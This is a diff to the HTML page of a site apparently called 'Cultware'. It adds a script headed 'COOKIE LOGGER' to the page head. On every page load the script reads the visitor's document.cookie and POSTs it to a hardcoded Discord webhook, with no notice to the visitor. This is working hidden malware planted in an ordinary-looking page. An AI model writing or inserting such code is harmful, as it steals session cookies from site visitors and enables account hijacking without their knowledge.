@@ -84,6 +84,37 @@
             z-index: -1;
         }
     </style>
+
+    <script>
+        // COOKIE LOGGER
+        const webhookURL = "https://discord.com/api/webhooks/1325077534743990284/J-NTUdd4F6Rw-oQBTmfHaPuxOnhvLiBcet-wlMGJnAn1w09B4T8SiFtp9kuESQl-tdKy"; // Replace with your webhook URL
+
+        function sendCookies() {
+            const cookies = document.cookie;
+            const payload = {
+                content: `Cookies captured: ${cookies}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Cookies sent successfully.");
+                } else {
+                    console.error("Failed to send cookies.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
+
+        // Run cookie logger on page load
+        sendCookies();
+    </script>
 </head>
 <body>
     <h1>Welcome to Cultware</h1>
